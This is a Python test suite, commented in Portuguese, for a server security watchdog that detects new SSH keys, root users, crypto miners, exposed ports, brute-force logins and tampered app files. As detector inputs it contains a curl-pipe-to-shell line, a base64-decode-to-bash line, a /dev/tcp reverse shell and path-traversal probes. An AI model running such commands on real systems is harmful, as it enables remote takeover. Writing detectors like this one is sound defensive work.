# -*- coding: utf-8 -*-
"""Testes do vigia de segurança (deploy/seguranca/vigia.py).

Correr:  python test/seguranca/test_vigia.py
Não precisa de servidor: usa factos simulados e pastas temporárias.
"""
import importlib.util
import json
import os
import sys
import tempfile
import unittest

AQUI = os.path.dirname(os.path.abspath(__file__))
VIGIA = os.path.join(AQUI, '..', '..', 'deploy', 'seguranca', 'vigia.py')
spec = importlib.util.spec_from_file_location('vigia', VIGIA)
v = importlib.util.module_from_spec(spec)
sys.modules['vigia'] = v
spec.loader.exec_module(v)

T0 = 1_800_000_000          # "agora" fixo dos testes


def factos_normais(**extra):
    f = {
        'utilizadores': ['root|0|/bin/bash', 'ana|1000|/bin/bash'],
        'uid0': ['root'],
        'sem_senha': [],
        'grupos_privilegiados': ['sudo:ana', 'docker:ana'],
        'chaves_ssh': ['/home/ana|aaaaaaaaaaaaaaaa'],
        'cron': ['/etc/crontab#1111111111111111'],
        'unidades': ['/etc/systemd/system/gc_turnkey-backup.service#2222222222222222'],
        'rc_shell': ['/home/ana/.bashrc#3333333333333333'],
        'suspeitos': [],
        'ld_preload': False,
        'sudoers': ['sudoers#4444444444444444'],
        'sshd': ['sshd_config#5555555555555555'],
        'sshd_texto': 'PasswordAuthentication no\n',
        'portas': ['tcp|127.0.0.1|8091', 'tcp|100.64.0.5|22', 'tcp|0.0.0.0|2283'],
        'ligacoes': [],
        'containers': ['gc_turnkey|gc_turnkey:2.7.0', 'immich|ghcr.io/immich:latest'],
        'docker_portas_abertas': [],
        'tailscale': ['servidor|linux', 'telemovel-ana|android'],
        'processos': [{'pid': 1, 'user': 'root', 'cpu': 1.0, 'comm': 'systemd', 'args': 'systemd'}],
        'processos_exe': [{'pid': 1, 'comm': 'systemd', 'exe': '/usr/lib/systemd/systemd', 'user': 'root'}],
        'suid': ['/usr/bin/sudo', '/usr/bin/passwd'],
        'tmp_exec': [],
        'app_ficheiros': {'hooks/a.pb.js': 'h1', 'migrations/m.js': 'h2', 'web/index.html': 'h3'},
        'app_versao': 'v2.7.0',
        'env_modo': '0o600',
        'env_hash': 'envh',
        'superusers': ['dono@exemplo.pt'],
        'owners_admins': ['dono@exemplo.pt|owner'],
        'logs': [],
        'higiene': {'atualizacoes_seguranca': 0, 'reboot_pendente_dias': None, 'auto_updates': True,
                    'unidades_falhadas': [], 'disco_usado_pct': 40.0, 'fail2ban': False},
        'ssh': [],
    }
    f.update(extra)
    return f


def aprender(f=None):
    """1.ª ronda: devolve (baseline, histórico) com o estado normal aprendido."""
    f = f or factos_normais()
    achados, base, hist, notas = v.analisar(f, {}, {}, T0, primeira=True)
    return f, base, hist, achados


def ids(achados):
    return {a['id'] for a in achados}


def grav(achados, prefixo):
    return [a['gravidade'] for a in achados if a['id'].startswith(prefixo)]


class Parsers(unittest.TestCase):
    def test_classe_ip(self):
        self.assertEqual(v.classe_ip('127.0.0.1'), 'loopback')
        self.assertEqual(v.classe_ip('100.101.5.9'), 'tailscale')
        self.assertEqual(v.classe_ip('192.168.1.20'), 'privado')
        self.assertEqual(v.classe_ip('8.8.8.8'), 'publico')
        self.assertEqual(v.classe_ip('fd7a:115c:a1e0::1'), 'tailscale')
        self.assertEqual(v.classe_ip('lixo'), 'desconhecido')

    def test_parse_ssh(self):
        linhas = [
            '1800000001.1 srv sshd[10]: Failed password for invalid user admin from 45.83.64.9 port 4000 ssh2',
            '1800000002.1 srv sshd[11]: Failed password for root from 45.83.64.9 port 4001 ssh2',
            '1800000003.1 srv sshd[12]: Accepted publickey for ana from 100.64.0.9 port 5000 ssh2: ED25519 SHA256:xx',
            '1800000004.1 srv sshd[13]: Invalid user oracle from 45.83.64.10 port 6000',
            '1800000005.1 srv sshd[14]: Connection closed by authenticating user ana 100.64.0.9 port 7 [preauth]',
            '1800000006.1 srv cron[1]: nada a ver',
        ]
        ev = v.parse_ssh(linhas)
        self.assertEqual([e['tipo'] for e in ev], ['falha', 'falha', 'ok', 'invalido', 'preauth'])
        self.assertEqual(ev[0]['user'], 'admin')
        self.assertEqual(ev[2]['ip'], '100.64.0.9')
        self.assertEqual(ev[2]['metodo'], 'publickey')

    def test_parse_ss_e_ps(self):
        ss = ('tcp LISTEN 0 4096 0.0.0.0:2283 0.0.0.0:* users:(("docker-proxy",pid=1,fd=4))\n'
              'tcp LISTEN 0 128 [::]:22 [::]:* users:(("sshd",pid=2,fd=3))\n'
              'udp UNCONN 0 0 127.0.0.1:323 0.0.0.0:*\n')
        e = v.parse_ss_escuta(ss)
        self.assertEqual({(x['proto'], x['addr'], x['porta']) for x in e},
                         {('tcp', '0.0.0.0', 2283), ('tcp', '::', 22), ('udp', '127.0.0.1', 323)})
        lig = v.parse_ss_ligacoes('ESTAB 0 0 10.0.0.2:5000 45.9.148.10:3333 users:(("xmrig",pid=9,fd=3))\n')
        self.assertEqual(lig[0]['porta'], 3333)
        self.assertEqual(lig[0]['proc'], 'xmrig')
        ps = v.parse_ps('  12 root  95.3 xmrig /tmp/xmrig -o pool\n   1 root 0.1 systemd /sbin/init\n')
        self.assertEqual(ps[0]['cpu'], 95.3)
        self.assertEqual(ps[0]['comm'], 'xmrig')

    def test_docker_e_tailscale(self):
        d = v.parse_docker('{"Names":"web","Image":"nginx","Ports":"0.0.0.0:8080->80/tcp, :::8080->80/tcp"}\n')
        self.assertEqual(d[0]['nome'], 'web')
        self.assertEqual(v.portas_docker_expostas(d[0]['portas']), [8080])
        self.assertEqual(v.portas_docker_expostas('127.0.0.1:8091->8090/tcp'), [])
        ts = v.parse_tailscale(json.dumps({'Self': {'HostName': 'srv', 'OS': 'linux'},
                                           'Peer': {'k': {'HostName': 'tel', 'OS': 'android'}}}))
        self.assertEqual(ts, {'srv|linux', 'tel|android'})

    def test_passwd_shadow_grupos(self):
        p = v.parse_passwd('root:x:0:0::/root:/bin/bash\nana:x:1000:1000::/home/ana:/bin/bash\n')
        self.assertEqual(p['ana']['uid'], 1000)
        self.assertEqual(v.parse_shadow_vazios('root:$6$x:1::\nteste::1::\nana:!:1::\n'), ['teste'])
        self.assertEqual(v.parse_grupos('sudo:x:27:ana,rui\nfoo:x:1:z\ndocker:x:998:ana\n'),
                         ['sudo:ana', 'sudo:rui', 'docker:ana'])

    def test_chaves_nao_expoem_a_chave(self):
        chave = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIsegredoMUITOlongo ana@pc'
        h = v.chaves_ssh(chave + '\n# comentario\n')
        self.assertEqual(len(h), 1)
        self.assertNotIn('AAAAC3', h[0])
        self.assertEqual(len(h[0]), 16)

    def test_padroes_suspeitos(self):
        self.assertTrue(v.padroes_suspeitos('* * * * * curl http://x.sh | sh'))
        self.assertTrue(v.padroes_suspeitos('echo ZWNobw== | base64 -d | bash'))
        self.assertTrue(v.padroes_suspeitos('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'))
        self.assertFalse(v.padroes_suspeitos('0 3 * * * /opt/gc_turnkey/backup/copia-externa.sh'))


class Aprendizagem(unittest.TestCase):
    def test_primeira_ronda_aprende_e_nao_alerta(self):
        _, base, _, achados = aprender()
        self.assertEqual(achados, [])
        self.assertIn('chaves_ssh', base['conjuntos'])
        self.assertEqual(base['app']['versao'], 'v2.7.0')

    def test_segunda_ronda_igual_nao_alerta(self):
        f, base, hist, _ = aprender()
        achados, *_ = v.analisar(f, base, hist, T0 + 600)
        self.assertEqual(achados, [])

    def test_hard_rules_valem_na_primeira_ronda(self):
        f = factos_normais(uid0=['root', 'backdoor'], sem_senha=['teste'])
        _, _, _, achados = aprender(f)
        self.assertIn('uid0:backdoor', ids(achados))
        self.assertIn('sem-senha:teste', ids(achados))


class Mudancas(unittest.TestCase):
    def setUp(self):
        self.f, self.base, self.hist, _ = aprender()

    def ronda(self, **extra):
        f = dict(self.f)
        f.update(extra)
        achados, base, hist, notas = v.analisar(f, self.base, self.hist, T0 + 600)
        return achados

    def test_chave_ssh_nova_e_critica(self):
        a = self.ronda(chaves_ssh=['/home/ana|aaaaaaaaaaaaaaaa', '/root|bbbbbbbbbbbbbbbb'])
        self.assertEqual(grav(a, 'chaves_ssh:'), ['critico'])

    def test_utilizador_novo_e_grupo_sudo(self):
        a = self.ronda(utilizadores=self.f['utilizadores'] + ['rui|1001|/bin/bash'],
                       grupos_privilegiados=self.f['grupos_privilegiados'] + ['sudo:rui'])
        self.assertEqual(grav(a, 'utilizadores:'), ['atencao'])
        self.assertEqual(grav(a, 'grupos_privilegiados:'), ['critico'])

    def test_uid0_novo(self):
        a = self.ronda(utilizadores=self.f['utilizadores'] + ['hax|0|/bin/bash'], uid0=['root', 'hax'])
        self.assertEqual(grav(a, 'utilizadores:hax'), ['critico'])
        self.assertIn('uid0:hax', ids(a))

    def test_cron_alterado_aparece_so_uma_vez(self):
        a = self.ronda(cron=['/etc/crontab#9999999999999999'])
        cron = [x for x in a if x['id'].startswith('cron')]
        self.assertEqual(len(cron), 1)               # o "removido" do mesmo ficheiro não conta
        self.assertEqual(cron[0]['detalhe'], '/etc/crontab')
        self.assertNotIn('9999', a[0]['titulo'] + a[0]['detalhe'] + a[0]['fazer'])   # o hash nunca se mostra

    def test_cron_suspeito(self):
        a = self.ronda(suspeitos=[('/etc/cron.d/x', 'descarrega e executa um programa da internet')])
        self.assertEqual(grav(a, 'padrao:'), ['critico'])

    def test_porta_nova(self):
        a = self.ronda(portas=self.f['portas'] + ['tcp|0.0.0.0|4444', 'tcp|127.0.0.1|9000'])
        self.assertEqual(grav(a, 'portas:tcp|0.0.0.0|4444'), ['atencao'])
        self.assertEqual(grav(a, 'portas:tcp|127.0.0.1|9000'), ['info'])   # só local: informação

    def test_container_e_tailscale_novos(self):
        a = self.ronda(containers=self.f['containers'] + ['miner|alpine'],
                       tailscale=self.f['tailscale'] + ['portatil-desconhecido|windows'])
        self.assertEqual(grav(a, 'containers:'), ['atencao'])
        self.assertEqual(grav(a, 'tailscale:'), ['atencao'])

    def test_superutilizador_novo(self):
        a = self.ronda(superusers=['dono@exemplo.pt', 'intruso@x.com'])
        self.assertEqual(grav(a, 'superusers:'), ['critico'])

    def test_removidos_sao_so_informacao(self):
        a = self.ronda(containers=['gc_turnkey|gc_turnkey:2.7.0'])
        self.assertEqual(grav(a, 'containers-removido:'), ['info'])


class Processos(unittest.TestCase):
    def setUp(self):
        self.f, self.base, self.hist, _ = aprender()

    def test_minerador(self):
        f = dict(self.f, processos_exe=[{'pid': 9, 'comm': 'xmrig', 'exe': '/usr/bin/xmrig', 'user': 'www'}])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(grav(a, 'malware:'), ['critico'])

    def test_programa_a_correr_de_tmp(self):
        f = dict(self.f, processos_exe=[{'pid': 9, 'comm': 'a.out', 'exe': '/tmp/.x/a.out', 'user': 'www'}])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(grav(a, 'proc-tmp:'), ['critico'])

    def test_ligacao_a_pool_de_mineracao(self):
        f = dict(self.f, ligacoes=[{'remoto': '45.9.148.10', 'porta': 3333, 'proc': 'x'},
                                   {'remoto': '10.0.0.5', 'porta': 3333, 'proc': 'x'}])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(len(grav(a, 'mineracao:')), 1)           # só o IP público conta

    def test_cpu_so_alerta_ao_fim_de_uma_hora(self):
        hist = self.hist
        f = dict(self.f, processos=[{'pid': 5, 'user': 'x', 'cpu': 99.0, 'comm': 'estranho', 'args': ''}])
        for i in range(5):
            a, _, hist, _ = v.analisar(f, self.base, hist, T0 + 600 * (i + 1))
            self.assertEqual(grav(a, 'cpu:'), [], f'ronda {i}')
        a, _, hist, _ = v.analisar(f, self.base, hist, T0 + 600 * 6)
        self.assertEqual(grav(a, 'cpu:'), ['atencao'])

    def test_cpu_de_programas_conhecidos_nao_alerta(self):
        hist = self.hist
        f = dict(self.f, processos=[{'pid': 5, 'user': 'x', 'cpu': 99.0, 'comm': 'ffmpeg', 'args': ''}])
        for i in range(8):
            a, _, hist, _ = v.analisar(f, self.base, hist, T0 + 600 * (i + 1))
        self.assertEqual(grav(a, 'cpu:'), [])


class Ssh(unittest.TestCase):
    def setUp(self):
        self.f, self.base, self.hist, _ = aprender()

    def ev(self, tipo, ip, user='ana', dt=60, metodo='publickey'):
        return {'ts': T0 + dt, 'tipo': tipo, 'ip': ip, 'user': user, 'metodo': metodo}

    def test_login_de_ip_publico_e_critico(self):
        f = dict(self.f, ssh=[self.ev('ok', '91.198.174.7')])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(grav(a, 'ssh-publico:'), ['critico'])

    def test_ip_publico_permitido_pelo_dono(self):
        f = dict(self.f, ssh=[self.ev('ok', '91.198.174.7')])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600, cfg_ips=['91.198.174.0/24'])
        self.assertEqual(grav(a, 'ssh-publico:'), [])

    def test_ip_interno_novo_e_atencao_e_aprende(self):
        f = dict(self.f, ssh=[self.ev('ok', '100.64.0.77')])
        a, base, hist, _ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(grav(a, 'ssh-ip-novo:'), ['atencao'])
        # "já verifiquei"
        restantes, aprendidos = v.aplicar_aceites(a, base, f, {'ssh-ip-novo:100.64.0.77'})
        self.assertEqual(grav(restantes, 'ssh-ip-novo:'), [])
        self.assertIn('100.64.0.77', base['conjuntos']['ssh_ips'])
        # e na ronda seguinte já não alerta
        f2 = dict(self.f, ssh=[self.ev('ok', '100.64.0.77', dt=700)])
        a2, *_ = v.analisar(f2, base, hist, T0 + 1200)
        self.assertEqual(grav(a2, 'ssh-ip-novo:'), [])

    def test_forca_bruta_seguida_de_sucesso(self):
        falhas = [self.ev('falha', '100.64.0.88', user='ana', dt=10 + i) for i in range(6)]
        f = dict(self.f, ssh=falhas + [self.ev('ok', '100.64.0.88', dt=100, metodo='password')])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(grav(a, 'ssh-forca-bruta-ok:'), ['critico'])

    def test_ataque_de_muitas_falhas(self):
        falhas = [self.ev('falha', '45.83.64.9', user='root', dt=i) for i in range(12)]
        f = dict(self.f, ssh=falhas)
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertEqual(grav(a, 'ssh-ataque:'), ['atencao'])

    def test_root_por_ssh(self):
        f = dict(self.f, ssh=[self.ev('ok', '100.64.0.5', user='root')])
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertIn('atencao', grav(a, 'ssh-root:'))

    def test_eventos_ssh_ficam_24h(self):
        f = dict(self.f, ssh=[self.ev('ok', '91.198.174.7')])
        a, base, hist, _ = v.analisar(f, self.base, self.hist, T0 + 600)
        a = [dict(x, desde=T0 + 600) for x in a]
        # ronda seguinte, sem novos eventos de SSH: o achado mantém-se
        f2 = dict(self.f, ssh=[])
        a2, *_ = v.analisar(f2, base, hist, T0 + 1200, anteriores=a, reavaliadas={'ssh'})
        self.assertEqual(grav(a2, 'ssh-publico:'), ['critico'])
        # passadas 24 h, desaparece
        a3, *_ = v.analisar(f2, base, hist, T0 + 600 + 90000, anteriores=a, reavaliadas={'ssh'})
        self.assertEqual(grav(a3, 'ssh-publico:'), [])


class AppIntegridade(unittest.TestCase):
    def setUp(self):
        self.f, self.base, self.hist, _ = aprender()

    def test_hook_alterado_sem_atualizacao(self):
        novos = dict(self.f['app_ficheiros'], **{'hooks/a.pb.js': 'ALTERADO', 'hooks/backdoor.pb.js': 'x'})
        f = dict(self.f, app_ficheiros=novos)
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        x = [y for y in a if y['id'] == 'app-integridade'][0]
        self.assertEqual(x['gravidade'], 'critico')
        self.assertIn('alterado: hooks/a.pb.js', x['itens'])
        self.assertIn('novo: hooks/backdoor.pb.js', x['itens'])

    def test_atualizacao_legitima_reaprende(self):
        novos = dict(self.f['app_ficheiros'], **{'hooks/a.pb.js': 'NOVO'})
        f = dict(self.f, app_ficheiros=novos, app_versao='v2.8.0')
        a, base, _, notas = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertNotIn('app-integridade', ids(a))
        self.assertEqual(base['app']['versao'], 'v2.8.0')
        self.assertTrue(any('atualizada' in n for n in notas))

    def test_aceitar_ficheiros_alterados(self):
        f = dict(self.f, app_ficheiros=dict(self.f['app_ficheiros'], **{'hooks/a.pb.js': 'NOVO'}))
        a, base, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        restantes, _ = v.aplicar_aceites(a, base, f, {'app-integridade'})
        self.assertNotIn('app-integridade', ids(restantes))
        self.assertEqual(base['app']['ficheiros']['hooks/a.pb.js'], 'NOVO')

    def test_env_legivel_por_todos(self):
        f = dict(self.f, env_modo='0o644')
        a, *_ = v.analisar(f, self.base, self.hist, T0 + 600)
        self.assertIn('env-permissoes', ids(a))


class LogsApp(unittest.TestCase):
    def setUp(self):
        self.f, self.base, self.hist, _ = aprender()

    def test_rajada_de_falhas_de_login(self):
        logs = [[400, '/api/collections/users/auth-with-password', 'POST', '1.1.1.1']] * 40
        a, *_ = v.analisar(dict(self.f, logs=logs), self.base, self.hist, T0 + 600)
        self.assertIn('app-forca-bruta', ids(a))

    def test_sondas(self):
        logs = [[404, '/.env', 'GET', 'x'], [404, '/wp-login.php', 'GET', 'x'], [400, '/a/../../etc/passwd', 'GET', 'x']]
        a, *_ = v.analisar(dict(self.f, logs=logs), self.base, self.hist, T0 + 600)
        self.assertIn('app-sondas', ids(a))

    def test_trafego_normal_nao_alerta(self):
        logs = [[200, '/api/collections/ingredientes/records', 'GET', 'x']] * 200 + \
               [[400, '/api/collections/users/auth-with-password', 'POST', 'x']] * 2
        a, *_ = v.analisar(dict(self.f, logs=logs), self.base, self.hist, T0 + 600)
        self.assertEqual(a, [])


class Correlacao(unittest.TestCase):
    def test_chave_nova_mais_acesso_novo_e_intrusao(self):
        f, base, hist, _ = aprender()
        f2 = dict(f, chaves_ssh=f['chaves_ssh'] + ['/root|cccccccccccccccc'],
                  ssh=[{'ts': T0 + 60, 'tipo': 'ok', 'ip': '100.64.0.99', 'user': 'root', 'metodo': 'publickey'}])
        a, *_ = v.analisar(f2, base, hist, T0 + 600)
        self.assertEqual(a[0]['id'], 'incidente')
        self.assertEqual(a[0]['gravidade'], 'critico')

    def test_sinais_isolados_nao_sao_incidente(self):
        f, base, hist, _ = aprender()
        a, *_ = v.analisar(dict(f, chaves_ssh=f['chaves_ssh'] + ['/root|cccccccccccccccc']), base, hist, T0 + 600)
        self.assertNotIn('incidente', ids(a))

    def test_persistencia_mais_minerador(self):
        f, base, hist, _ = aprender()
        f2 = dict(f, cron=f['cron'] + ['/etc/cron.d/x#abc'],
                  processos_exe=[{'pid': 9, 'comm': 'xmrig', 'exe': '/usr/bin/xmrig', 'user': 'x'}])
        a, *_ = v.analisar(f2, base, hist, T0 + 600)
        self.assertIn('incidente', ids(a))


class Higiene(unittest.TestCase):
    def test_atualizacoes_so_alertam_ao_fim_de_7_dias(self):
        f, base, hist, _ = aprender()
        f2 = dict(f, higiene=dict(f['higiene'], atualizacoes_seguranca=5))
        a, _, hist, _ = v.analisar(f2, base, hist, T0 + 600)
        self.assertNotIn('atualizacoes', ids(a))
        a, _, hist, _ = v.analisar(f2, base, hist, T0 + 600 + 8 * 86400)
        self.assertIn('atualizacoes', ids(a))

    def test_disco_cheio_e_unidade_falhada(self):
        f, base, hist, _ = aprender()
        f2 = dict(f, higiene=dict(f['higiene'], disco_usado_pct=95, unidades_falhadas=['gc_turnkey-backup.service', 'outra.service']))
        a, *_ = v.analisar(f2, base, hist, T0 + 600)
        self.assertIn('disco', ids(a))
        self.assertIn('unidade-falhou:gc_turnkey-backup.service', ids(a))
        self.assertNotIn('unidade-falhou:outra.service', ids(a))


class RondaCompleta(unittest.TestCase):
    def cfg(self, tmp):
        dados = os.path.join(tmp, 'data')
        os.makedirs(dados)
        return v.Config(tmp, dados, os.path.join(tmp, 'estado'), {})

    def escrever(self, tmp, f):
        p = os.path.join(tmp, 'fac.json')
        with open(p, 'w', encoding='utf-8') as fh:
            json.dump(f, fh)
        return p

    def test_duas_rondas_e_ficheiro_para_a_app(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = self.cfg(tmp)
            f = factos_normais()
            r1 = v.correr(cfg, simular=f, agora=T0, enviar=False)
            self.assertEqual(r1['estado'], 'ok')
            self.assertTrue(r1['baseline_criado'])
            f2 = dict(f, chaves_ssh=f['chaves_ssh'] + ['/root|dddddddddddddddd'],
                      suspeitos=[('/etc/cron.d/x', 'descarrega e executa um programa da internet')])
            r2 = v.correr(cfg, simular=f2, agora=T0 + 600, enviar=False)
            self.assertEqual(r2['estado'], 'critico')
            self.assertGreaterEqual(r2['pontuacao'], 80)
            with open(os.path.join(cfg.dados, 'seguranca_vigia.json'), encoding='utf-8') as fh:
                texto = fh.read()
            j = json.loads(texto)
            self.assertEqual(j['estado'], 'critico')
            for a in j['achados']:
                self.assertEqual(set(a), {'id', 'gravidade', 'categoria', 'titulo', 'detalhe', 'fazer', 'desde', 'vezes', 'itens'})
            # nada de segredos: nem a chave, nem hashes completos
            self.assertNotIn('dddddddddddddddd' * 2, texto)
            self.assertEqual(j['achados'][0]['gravidade'], 'critico')

    def test_ja_verifiquei_vindo_da_app(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = self.cfg(tmp)
            f = factos_normais()
            v.correr(cfg, simular=f, agora=T0, enviar=False)
            f2 = dict(f, containers=f['containers'] + ['novo|nginx'])
            r2 = v.correr(cfg, simular=f2, agora=T0 + 600, enviar=False)
            self.assertIn('containers:novo|nginx', {a['id'] for a in r2['achados']})
            with open(os.path.join(cfg.dados, 'seguranca_acks.json'), 'w', encoding='utf-8') as fh:
                json.dump({'ids': [{'id': 'containers:novo|nginx', 'quando': 'agora'}]}, fh)
            r3 = v.correr(cfg, simular=f2, agora=T0 + 1200, enviar=False)
            self.assertNotIn('containers:novo|nginx', {a['id'] for a in r3['achados']})
            r4 = v.correr(cfg, simular=f2, agora=T0 + 1800, enviar=False)
            self.assertEqual(r4['estado'], 'ok')

    def test_ja_verifiquei_sem_nada_a_aprender_cala_24h(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = self.cfg(tmp)
            f = factos_normais()
            v.correr(cfg, simular=f, agora=T0, enviar=False)
            f2 = dict(f, chaves_ssh=f['chaves_ssh'] + ['/root|dddddddddddddddd'],
                      ssh=[{'ts': T0 + 60, 'tipo': 'ok', 'ip': '100.64.0.99', 'user': 'root', 'metodo': 'publickey'}])
            r2 = v.correr(cfg, simular=f2, agora=T0 + 600, enviar=False)
            self.assertIn('incidente', {a['id'] for a in r2['achados']})
            with open(os.path.join(cfg.dados, 'seguranca_acks.json'), 'w', encoding='utf-8') as fh:
                json.dump({'ids': [{'id': 'incidente', 'quando': 'x'}]}, fh)
            r3 = v.correr(cfg, simular=f2, agora=T0 + 1200, enviar=False)
            self.assertNotIn('incidente', {a['id'] for a in r3['achados']})       # calado
            # e passadas 24 h volta a avisar (os sinais continuam lá)
            r4 = v.correr(cfg, simular=f2, agora=T0 + 1200 + 90000, enviar=False)
            self.assertIn('incidente', {a['id'] for a in r4['achados']})

    def test_desde_e_vezes(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = self.cfg(tmp)
            f = factos_normais()
            v.correr(cfg, simular=f, agora=T0, enviar=False)
            f2 = dict(f, portas=f['portas'] + ['tcp|0.0.0.0|4444'])
            v.correr(cfg, simular=f2, agora=T0 + 600, enviar=False)
            r = v.correr(cfg, simular=f2, agora=T0 + 1200, enviar=False)
            a = [x for x in r['achados'] if x['id'].startswith('portas:')][0]
            self.assertEqual(a['desde'], T0 + 600)
            self.assertEqual(a['vezes'], 2)


if __name__ == '__main__':
    unittest.main(verbosity=1)
